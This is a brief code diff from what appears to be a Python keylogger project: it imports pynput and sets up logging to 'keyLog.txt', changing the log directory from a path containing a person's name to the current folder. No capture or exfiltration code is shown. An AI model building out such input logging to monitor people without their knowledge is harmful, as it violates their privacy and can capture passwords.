@@ -3,7 +3,7 @@ from pynput import mouse
 import logging
 import datetime
 
-log_dir = "C:/Users/Cassandra McCormack/Key Logger"
+log_dir = "./"
 logging.basicConfig(filename = ("keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 
